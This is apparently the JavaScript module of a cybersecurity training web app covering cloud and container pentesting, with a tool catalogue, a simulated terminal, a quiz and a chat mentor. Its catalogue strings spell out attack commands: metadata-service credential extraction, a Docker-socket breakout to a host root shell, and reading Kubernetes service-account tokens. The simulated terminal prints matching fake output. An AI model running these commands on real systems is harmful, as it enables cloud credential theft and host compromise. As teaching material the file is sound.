// ==========================================
// PWNBOX MODULE 09: CLOUD & CONTAINER SECURITY
// Multi-Cloud & Kubernetes Pentesting Arsenal
// ==========================================
const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) || 
                 (typeof GROQ_API_KEY !== "undefined" ? GROQ_API_KEY : "") || 
                 localStorage.getItem('pwnbox_groq_api_key') || 
                 "";

const MODULE_KEY        = 'module_cloudsec_completed';
const CUSTOM_TOOLS_KEY  = 'cloudsec_custom_tools';
const EDITED_TOOLS_KEY  = 'cloudsec_edited_default_tools';
const DELETED_TOOLS_KEY = 'cloudsec_deleted_default_indices';
const CUSTOM_CATS_KEY   = 'cloudsec_custom_categories';

const defaultTools = [
    {
        name: "1. Pacu & ScoutSuite (AWS Attack Framework)",
        link: "https://github.com/RhinoSecurityLabs/pacu",
        category: "CloudAudit",
        brief: "The premier open-source AWS exploitation framework developed by Rhino Security Labs. Designed specifically for offensive security practitioners, Pacu enables operators to perform automated privilege escalation, enumerate unmonitored IAM roles, bypass AWS CloudTrail logging via evasive API calls, and dump database snapshots across multi-account AWS Organizations.",
        use: "Launch Pacu interactive console: <code>pacu</code><br>Set compromised API keys: <code>set_keys</code><br>Enumerate IAM permissions: <code>run iam__enum_permissions</code><br>Scan for privilege escalation paths: <code>run iam__privesc_scan</code>",
        useful: "Most cloud breaches occur not through 0-days, but through overly permissive IAM policies (e.g. <code>iam:CreateAccessKey</code> or <code>iam:PassRole</code>). Pacu algorithmically identifies and executes all 21 known AWS IAM escalation methods in minutes."
    },
    {
        name: "2. IMDSv1 & IMDSv2 Metadata Hunter",
        link: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
        category: "CloudPivoting",
        brief: "The non-routable link-local IP address (169.254.169.254) accessible by all AWS EC2 instances, Google Cloud Compute Engine, and Azure VMs. When web apps suffer from Server-Side Request Forgery (SSRF), attackers query this endpoint to extract temporary STS IAM instance credentials, API keys, and user-data initialization scripts containing secrets.",
        use: "IMDSv1 direct extraction:<br><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br>IMDSv2 token acquisition & query:<br><code>TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")<br>curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role</code>",
        useful: "The cornerstone of cloud web application breaches (as seen in the famous Capital One incident). IMDSv2 introduces stateful session tokens and hop-limit boundaries to mitigate SSRF."
    },
    {
        name: "3. Trivy & Grype (Container & SBOM Scanner)",
        link: "https://github.com/aquasecurity/trivy",
        category: "ContainerSecurity",
        brief: "Comprehensive, lightning-fast security scanner for container images, file systems, Git repositories, and Kubernetes clusters. It detects known CVEs, hardcoded API secrets, licenses, and Infrastructure as Code (IaC) misconfigurations within Docker and OCI images before deployment into production registries.",
        use: "Scan remote Docker image: <code>trivy image --severity HIGH,CRITICAL python:3.9-slim</code><br>Scan Kubernetes pod manifest: <code>trivy k8s --report summary cluster</code><br>Audit Terraform directory: <code>trivy config ./terraform/</code>",
        useful: "Software Supply Chain security is mandatory in modern devops. Trivy generates CycloneDX/SPDX Software Bill of Materials (SBOM) and catches vulnerable base images before attackers weaponize them."
    },
    {
        name: "4. Docker Socket & Privileged Escape",
        link: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout",
        category: "ContainerEscape",
        brief: "Techniques abused to break out of isolated container runtimes into the underlying host operating system. The most common misconfiguration occurs when developers mount the host Docker UNIX socket (<code>/var/run/docker.sock</code>) inside a CI/CD container, or run containers with <code>--privileged</code> flags granting raw device access (<code>cap_sys_admin</code>).",
        use: "Mounted socket breakout (spawns root shell on host):<br><code>docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash</code><br>Privileged device breakout:<br><code>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && ...</code>",
        useful: "Container isolation is not a security sandbox boundary unless properly restricted with Seccomp, AppArmor, non-root user execution, and read-only root filesystems."
    },
    {
        name: "5. Kube-Hunter & Peirates (Kubernetes Attack Matrix)",
        link: "https://github.com/aquasecurity/kube-hunter",
        category: "K8sSecurity",
        brief: "Kubernetes penetration testing and attack automation frameworks. Kube-Hunter hunts for open security weaknesses in clusters (like unauthenticated Kubelet API ports 10250/10255, exposed etcd databases on port 2379, and insecure API servers), while Peirates automates cluster privilege escalation from a compromised pod.",
        use: "Active cluster scanning:<br><code>kube-hunter --remote 192.168.1.100 --active</code><br>Check compromised pod RBAC privileges:<br><code>kubectl auth can-i --list</code><br>Extract serviceaccount secret token:<br><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>",
        useful: "Modern microservices run on Kubernetes. Gaining pod access is only step one; stealing cluster tokens and escalating to ClusterRoleBinding enables complete cloud infrastructure compromise."
    },
    {
        name: "6. Checkov & tfsec (IaC SAST Scanner)",
        link: "https://github.com/bridgecrewio/checkov",
        category: "IaCSecurity",
        brief: "Static code analysis tools for Infrastructure as Code (IaC). Scans Terraform, Terraform Plan, CloudFormation, AWS SAM, Kubernetes, Helm charts, and Dockerfiles to prevent security flaws (such as open security groups <code>0.0.0.0/0</code>, unencrypted S3 buckets, and wildcard IAM permissions) from being provisioned.",
        use: "Scan directory of Terraform files:<br><code>checkov -d ./infrastructure --framework terraform</code><br>Run fast tfsec audit with concise output:<br><code>tfsec . --format compact</code>",
        useful: "Shift-Left cloud security: fixing cloud misconfigurations at the code level costs 100x less time and money than responding to active cloud breach incident responses."
    },
    {
        name: "7. S3Scanner & CloudBrute (Object Storage Recon)",
        link: "https://github.com/sa7mon/S3Scanner",
        category: "CloudStorage",
        brief: "Automated scanning and brute-forcing tools that locate public and misconfigured cloud object storage repositories across AWS S3, Google Cloud Storage (GCS), Azure Blob Storage, and DigitalOcean Spaces. It inspects public ACLs, read/write permissions, and anonymous file listings.",
        use: "Scan single bucket: <code>s3scanner scan --bucket confidential-corp-data</code><br>Dump publicly exposed files: <code>s3scanner dump --bucket target-bucket</code><br>Brute-force cloud assets via wordlist: <code>cloudbrute -d target.com -k wordlist.txt</code>",
        useful: "Leaked databases, database backup archives (.sql.gz), customer PII, and TLS private keys are regularly discovered by red teams in misconfigured public storage buckets."
    }
];

let tools = [];
let editingToolIndex = null;

const categoriesTemplate = {
    "CloudAudit": [],
    "CloudPivoting": [],
    "ContainerSecurity": [],
    "ContainerEscape": [],
    "K8sSecurity": [],
    "IaCSecurity": [],
    "CloudStorage": []
};
const catDisplayNamesTemplate = {
    "CloudAudit": "☁️ Cloud IAM & Auditing",
    "CloudPivoting": "🌐 IMDS & Cloud Pivoting",
    "ContainerSecurity": "📦 Container Security & SBOM",
    "ContainerEscape": "🔓 Container Breakout",
    "K8sSecurity": "☸️ Kubernetes Security",
    "IaCSecurity": "📜 Infrastructure as Code (IaC)",
    "CloudStorage": "🪣 Cloud Storage & Buckets"
};
const defaultCategoryOptionsHtml = `
            <option value="CloudAudit">☁️ Cloud IAM & Auditing</option>
            <option value="CloudPivoting">🌐 IMDS & Cloud Pivoting</option>
            <option value="ContainerSecurity">📦 Container Security & SBOM</option>
            <option value="ContainerEscape">🔓 Container Breakout</option>
            <option value="K8sSecurity">☸️ Kubernetes Security</option>
            <option value="IaCSecurity">📜 Infrastructure as Code (IaC)</option>
            <option value="CloudStorage">🪣 Cloud Storage & Buckets</option>`;

function init() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';

    const moduleCategories = {};
    for (const k of Object.keys(categoriesTemplate)) moduleCategories[k] = [];
    const moduleCatDisplayNames = { ...catDisplayNamesTemplate };

    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        for (const [k, v] of Object.entries(customCats)) {
            moduleCategories[k] = [];
            moduleCatDisplayNames[k] = v;
        }
    } catch(e) { console.error(e); }

    const defaultCatKey = Object.keys(moduleCategories)[0];
    tools.forEach((tool, index) => {
        const cat = tool.category || defaultCatKey;
        if (moduleCategories[cat]) moduleCategories[cat].push({ tool, index });
        else {
            if (!moduleCategories[defaultCatKey]) moduleCategories[defaultCatKey] = [];
            moduleCategories[defaultCatKey].push({ tool, index });
        }
    });

    for (const [catName, catTools] of Object.entries(moduleCategories)) {
        if (catTools.length === 0) continue;
        const h = document.createElement('div');
        h.className = 'category-header';
        h.innerText = moduleCatDisplayNames[catName] || catName;
        list.appendChild(h);
        catTools.forEach(({ tool, index }) => {
            const div = document.createElement('div');
            div.className = 'tool-item';
            div.innerText = tool.name.split('.')[1]?.trim() || tool.name;
            div.onclick = () => showDetails(index, div);
            list.appendChild(div);
        });
    }

    if (!apiKey) {
        const dot = document.getElementById('statusDot');
        if (dot) dot.classList.remove('online');
        if (typeof addBotMessage === 'function') {
            addBotMessage("⚠️ API key not configured. Please configure GROQ_API_KEY in js/config.js.");
        }
    }
}

function reloadAllTools() {
    tools = defaultTools.map((t, idx) => ({ ...t, originalIndex: idx }));
    try {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        tools = tools.filter(t => !del.includes(t.originalIndex));
    } catch(e) {}
    try {
        const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
        tools.forEach(t => { if (edited[t.originalIndex]) Object.assign(t, edited[t.originalIndex]); });
    } catch(e) {}
    loadCustomTools();
    init();
}

function showDetails(index, element) {
    document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
    if (element) element.classList.add('active');
    const tool = tools[index];
    if (!tool) return;
    const catClass = `badge-${(tool.category || '').toLowerCase()}`;
    const displayCatName = (tool.category || '').replace(/_/g, ' ');
    const detailsPanel = document.getElementById('detailsPanel');
    if (!detailsPanel) return;

    detailsPanel.innerHTML = `
        <div class="card">
            <h1 style="display:flex;justify-content:space-between;align-items:center;width:100%;">
                <span>${tool.name.split('.')[1]?.trim() || tool.name}<span class="badge ${catClass}">${displayCatName}</span></span>
                <div style="display:flex;gap:8px;align-items:center;">
                    <button class="btn btn-edit-tool" onclick="openEditToolModal(${index})" style="font-size:0.8rem;padding:6px 12px;">✏️ Edit</button>
                    <button class="btn btn-delete-tool" onclick="confirmDeleteTool(${index})" style="font-size:0.8rem;padding:6px 12px;">🗑️ Delete</button>
                    <a href="${tool.link}" target="_blank" style="font-size:0.8rem;padding:6px 12px;">Launch ↗</a>
                </div>
            </h1>
            <div class="section-label">Simply Explained (What is it?)</div>
            <div class="section-content">${tool.brief}</div>
            <div class="section-label">How to actually use it</div>
            <div class="section-content">${tool.use}</div>
            <div class="section-label">Why Hackers care about this</div>
            <div class="section-content">${tool.useful}</div>
        </div>`;
    if (window.innerWidth <= 768) switchMobileTab('details');
}

function updateCompletionButton() {
    const btn = document.getElementById('completeModuleBtn');
    if (!btn) return;
    const done = localStorage.getItem(MODULE_KEY) === 'true';
    btn.innerText = done ? "✓ Module Completed" : "Mark Module Completed";
    btn.classList.toggle('completed', done);
}

function toggleModuleCompletion() {
    localStorage.setItem(MODULE_KEY, !(localStorage.getItem(MODULE_KEY) === 'true'));
    updateCompletionButton();
}

function openAddToolModal() {
    editingToolIndex = null;
    const title = document.querySelector('#addToolModal h3');
    if (title) title.innerText = "Add Custom Tool";
    const sub = document.querySelector('#addToolForm button[type="submit"]');
    if (sub) sub.innerText = "Add Tool";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    cancelNewCategory();
    loadCustomCategories();
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.offsetHeight;
        modal.classList.add('active');
    }
    const nameInput = document.getElementById('toolName');
    if (nameInput) nameInput.focus();
}

function openEditToolModal(index) {
    editingToolIndex = index;
    const tool = tools[index];
    if (!tool) return;
    const title = document.querySelector('#addToolModal h3');
    if (title) title.innerText = "Edit Tool Info";
    const sub = document.querySelector('#addToolForm button[type="submit"]');
    if (sub) sub.innerText = "Save Changes";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    cancelNewCategory();
    loadCustomCategories();
    document.getElementById('toolName').value = tool.name.includes('.') ? tool.name.split('.')[1].trim() : tool.name.trim();
    document.getElementById('toolLink').value = tool.link;
    document.getElementById('toolCategory').value = tool.category;
    document.getElementById('toolBrief').value = tool.brief;
    document.getElementById('toolUse').value = tool.use;
    document.getElementById('toolUseful').value = tool.useful;
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.offsetHeight;
        modal.classList.add('active');
    }
}

function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => {
            modal.style.display = 'none';
            const form = document.getElementById('addToolForm');
            if (form) form.reset();
        }, 300);
    }
}

function loadCustomTools() {
    try {
        const stored = localStorage.getItem(CUSTOM_TOOLS_KEY);
        if (stored) {
            JSON.parse(stored).forEach((tool, idx) => {
                const match = tool.name.match(/^\d+\.\s*(.*)$/);
                tool.name = `${tools.length + 1}. ${match ? match[1] : tool.name}`;
                tool.originalIndex = null;
                tool.customIndex = idx;
                tools.push(tool);
            });
        }
    } catch(e) { console.error(e); }
}

function submitNewTool(e) {
    if (e && e.preventDefault) e.preventDefault();
    const vals = {
        name: document.getElementById('toolName').value.trim(),
        link: document.getElementById('toolLink').value.trim(),
        category: document.getElementById('toolCategory').value,
        brief: document.getElementById('toolBrief').value.trim(),
        use: document.getElementById('toolUse').value.trim(),
        useful: document.getElementById('toolUseful').value.trim()
    };

    if (editingToolIndex !== null) {
        const orig = tools[editingToolIndex];
        if (orig && orig.originalIndex !== null) {
            const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
            edited[orig.originalIndex] = vals;
            localStorage.setItem(EDITED_TOOLS_KEY, JSON.stringify(edited));
        } else if (orig) {
            const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
            ct[orig.customIndex] = vals;
            localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
        }
    } else {
        const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        ct.push(vals);
        localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
    }

    closeAddToolModal();
    reloadAllTools();
    setTimeout(() => {
        let foundIndex = 0, newToolEl = null;
        tools.forEach((t, idx) => {
            if ((t.name.includes('.') ? t.name.split('.')[1].trim() : t.name.trim()) === vals.name) foundIndex = idx;
        });
        document.querySelectorAll('.tool-item').forEach(el => {
            if (el.innerText === vals.name) newToolEl = el;
        });
        if (newToolEl) showDetails(foundIndex, newToolEl);
    }, 100);
}

function confirmDeleteTool(index) {
    const rawName = tools[index].name.includes('.') ? tools[index].name.split('.')[1].trim() : tools[index].name.trim();
    if (typeof window.tacticalConfirm === 'function') {
        window.tacticalConfirm({
            title: "DELETE CUSTOM TOOL",
            message: `Are you sure you want to delete "${rawName}" from your active tool arsenal?`,
            confirmText: "🗑️ DELETE TOOL",
            cancelText: "CANCEL",
            type: "danger",
            onConfirm: () => deleteTool(index)
        });
    } else if (confirm(`Are you sure you want to delete "${rawName}"?`)) {
        deleteTool(index);
    }
}

function deleteTool(index) {
    const tool = tools[index];
    if (!tool) return;
    if (tool.originalIndex !== null) {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        if (!del.includes(tool.originalIndex)) {
            del.push(tool.originalIndex);
            localStorage.setItem(DELETED_TOOLS_KEY, JSON.stringify(del));
        }
    } else {
        const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        ct.splice(tool.customIndex, 1);
        localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
    }
    reloadAllTools();
    document.getElementById('detailsPanel').innerHTML = `<div style="text-align:center;color:var(--text-muted);margin-top:20vh;"><h3>Select a tool from the menu to view beginner-friendly intelligence data.</h3></div>`;
}

function loadCustomCategories() {
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        const sel = document.getElementById('toolCategory');
        if (!sel) return;
        sel.innerHTML = defaultCategoryOptionsHtml;
        for (const [k, v] of Object.entries(customCats)) {
            sel.innerHTML += `<option value="${k}">${v}</option>`;
        }
    } catch(e) { console.error(e); }
}

function showNewCategoryForm() {
    const grp = document.getElementById('newCategoryGroup');
    if (grp) grp.style.display = 'block';
    const nameInput = document.getElementById('newCategoryName');
    if (nameInput) nameInput.focus();
}

function cancelNewCategory() {
    const grp = document.getElementById('newCategoryGroup');
    if (grp) grp.style.display = 'none';
    const n = document.getElementById('newCategoryName');
    if (n) n.value = '';
    const i = document.getElementById('newCategoryIcon');
    if (i) i.value = '';
}

function saveNewCategory() {
    const name = document.getElementById('newCategoryName').value.trim();
    const icon = document.getElementById('newCategoryIcon').value.trim() || '⚙️';
    if (!name) return;
    const key = name.replace(/\s+/g, '');
    const label = `${icon} ${name}`;
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        customCats[key] = label;
        localStorage.setItem(CUSTOM_CATS_KEY, JSON.stringify(customCats));
        loadCustomCategories();
        document.getElementById('toolCategory').value = key;
        cancelNewCategory();
    } catch(e) { console.error(e); }
}

function switchMobileTab(tabId) {
    document.querySelectorAll('.nav-tab').forEach(btn => btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId)));
    document.body.className = document.body.className.replace(/\btab-\w+\b/g,'').trim();
    document.body.classList.add('tab-' + tabId);
}

window.openAddToolModal = openAddToolModal;
window.openEditToolModal = openEditToolModal;
window.closeAddToolModal = closeAddToolModal;
window.submitNewTool = submitNewTool;
window.confirmDeleteTool = confirmDeleteTool;
window.showNewCategoryForm = showNewCategoryForm;
window.cancelNewCategory = cancelNewCategory;
window.saveNewCategory = saveNewCategory;
window.switchMobileTab = switchMobileTab;
window.toggleModuleCompletion = toggleModuleCompletion;
window.showDetails = showDetails;
window.reloadAllTools = reloadAllTools;
// --- PANEL TAB SWITCHING ---
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
    });

    if (tabName === 'chat') {
        const btn = document.querySelector(".panel-tab[onclick*='chat']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('chatTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'terminal') {
        const btn = document.querySelector(".panel-tab[onclick*='terminal']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('terminalTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'quiz') {
        const btn = document.querySelector(".panel-tab[onclick*='quiz']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('quizTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    }
}

// --- TERMINAL COMMAND SANDBOX ---
function handleTerminalEnter(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const cmd = input.value.trim().toLowerCase();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const output = document.getElementById('terminalOutput');
    if (!output) return;

    const row = document.createElement('div');
    row.style.marginBottom = '6px';
    row.innerHTML = `<span style="color: #38bdf8;">cloud-operator@aws-pod:~$</span> <span style="color: #ffffff;">${cmd}</span>`;
    output.appendChild(row);

    const res = document.createElement('div');
    res.style.marginBottom = '12px';

    if (cmd === 'help') {
        res.innerHTML = `
            <div style="color: #0284c7; font-weight: bold;">AVAILABLE CLOUD OPERATIONS COMMANDS:</div>
            <div>- <b>imds</b>: Query AWS IMDSv2 metadata service for STS session tokens</div>
            <div>- <b>s3-enum</b>: Scan object storage buckets for public read/write ACLs</div>
            <div>- <b>docker-breakout</b>: Execute socket container escape to host namespace</div>
            <div>- <b>kubectl-can-i</b>: Inspect Kubernetes RBAC permissions for current pod ServiceAccount</div>
            <div>- <b>clear</b>: Clear terminal display</div>
        `;
    } else if (cmd === 'imds') {
        res.innerHTML = `
            <span style="color: #10b981;">[+] Step 1: Requesting IMDSv2 Session Token from 169.254.169.254...<br/>
            [+] PUT /latest/api/token -> Received Token: AQAAANcm4... (TTL: 21600s)<br/>
            [+] Step 2: Querying STS IAM Instance Profile Credentials with X-aws-ec2-metadata-token...<br/>
            [✓] EXTRACTED TEMPORARY IAM CREDENTIALS (SIMULATED):<br/>
            &nbsp;&nbsp;AccessKeyId: [DEMO-ASIA-REDACTED-SESSION-KEY]<br/>
            &nbsp;&nbsp;SecretAccessKey: [DEMO-AWS-SECRET-REDACTED-KEY]<br/>
            &nbsp;&nbsp;Token: IQoJb3JpZ2luX2Vj...<br/>
            &nbsp;&nbsp;Expiration: 2026-11-07T04:12:00Z</span>
        `;
    } else if (cmd === 's3-enum') {
        res.innerHTML = `
            <span style="color: #eab308;">[*] Scanning s3://acme-corp-prod-backups...<br/>
            [!] Status: PUBLIC ACCESS ENABLED (AllUsers: READ)<br/>
            [+] Found 4 objects:<br/>
            &nbsp;&nbsp;- 2026-11-01_db_dump.sql.gz (1.4 GB)<br/>
            &nbsp;&nbsp;- id_rsa_backup.pem (3.2 KB)<br/>
            &nbsp;&nbsp;- production.env (1.8 KB)<br/>
            &nbsp;&nbsp;- customer_pii_export.csv (84.1 MB)<br/>
            [✓] High-severity data exposure confirmed.</span>
        `;
    } else if (cmd === 'docker-breakout') {
        res.innerHTML = `
            <span style="color: #f43f5e;">[*] Checking /var/run/docker.sock socket permissions...<br/>
            [+] Docker socket writable: srw-rw---- 1 root docker<br/>
            [+] Executing: docker run -v /:/host -it alpine chroot /host /bin/sh<br/>
            [✓] CONTAINER BREAKOUT COMPLETE: root@ip-10-0-1-42:/# whoami -> root<br/>
            [+] Host filesystem accessible under /host. Container namespace escaped.</span>
        `;
    } else if (cmd === 'kubectl-can-i') {
        res.innerHTML = `
            <span style="color: #38bdf8;">[*] Querying Kubernetes API server (https://10.96.0.1:443)...<br/>
            [+] Evaluating ServiceAccount: default:sa-web-deployer<br/>
            &nbsp;&nbsp;pods .................... CREATE, GET, LIST, WATCH, DELETE<br/>
            &nbsp;&nbsp;secrets ................. GET, LIST [CRITICAL: Cluster secrets exposed]<br/>
            &nbsp;&nbsp;deployments ............. *<br/>
            [!] Escalation vector: ServiceAccount has permission to read cluster secrets!</span>
        `;
    } else if (cmd === 'clear') {
        output.innerHTML = '';
        return;
    } else {
        res.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help' to view cloud operations commands.</span>`;
    }

    output.appendChild(res);
    output.scrollTop = output.scrollHeight;
}

// --- QUIZ VERIFICATION ---
function checkQuizAnswer(qNum, correctVal) {
    const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
    if (!selected) return;

    if (selected.value === correctVal) {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✓ CORRECT!", "Outstanding! You identified the proper cloud and container security mechanism.", "success");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✓ CORRECT!", message: "Outstanding! You identified the proper cloud security mechanism.", type: "success" });
        } else {
            alert("✓ CORRECT! That is the proper cloud security mechanism.");
        }
    } else {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✕ INCORRECT", "Review the IMDS, Docker breakout, or K8s RBAC notes and try again.", "error");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✕ INCORRECT", message: "Review the cloud security notes and try again.", type: "danger" });
        } else {
            alert("✕ INCORRECT. Review the cloud security notes.");
        }
    }
}

// --- AI MENTOR (GROQ INTEGRATION) ---
async function sendMessage() {
    const input = document.getElementById('chatInput');
    const msg = input.value.trim();
    if (!msg) return;

    const history = document.getElementById('chatHistory');
    const userDiv = document.createElement('div');
    userDiv.className = 'msg user';
    userDiv.textContent = msg;
    history.appendChild(userDiv);
    input.value = '';

    const botDiv = document.createElement('div');
    botDiv.className = 'msg bot';
    botDiv.textContent = 'Querying Cloud Intelligence Oracle...';
    history.appendChild(botDiv);
    history.scrollTop = history.scrollHeight;

    try {
        let content = '';
        if (typeof window !== "undefined" && window.GroqService && window.GroqService.callGroqChat) {
            const data = await window.GroqService.callGroqChat({
                model: "llama-3.3-70b-versatile",
                messages: [
                    {
                        role: "system",
                        content: "You are an elite Cloud & Container Security Mentor on the PwnBox cybersecurity training platform. Explain AWS, Azure, Docker, Kubernetes, and IaC exploitation and defense clearly with practical terminal examples and Hinglish analogies if appropriate."
                    },
                    { role: "user", content: msg }
                ],
                temperature: 0.5,
                max_tokens: 600
            });
            content = data.choices[0].message.content;
        } else {
            const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    model: "llama-3.3-70b-versatile",
                    messages: [
                        {
                            role: "system",
                            content: "You are an elite Cloud & Container Security Mentor on the PwnBox cybersecurity training platform. Explain AWS, Azure, Docker, Kubernetes, and IaC exploitation and defense clearly with practical terminal examples and Hinglish analogies if appropriate."
                        },
                        { role: "user", content: msg }
                    ],
                    temperature: 0.5,
                    max_tokens: 600
                })
            });

            if (!response.ok) throw new Error("API request failed");
            const data = await response.json();
            content = data.choices[0].message.content;
        }
        botDiv.textContent = content;
    } catch (e) {
        botDiv.textContent = "Downlink failed. Ensure Groq API key is valid in js/config.js or test commands in the Cloud CLI Sandbox tab.";
    }
    history.scrollTop = history.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

document.addEventListener('DOMContentLoaded', () => {
    reloadAllTools();
    updateCompletionButton();
});
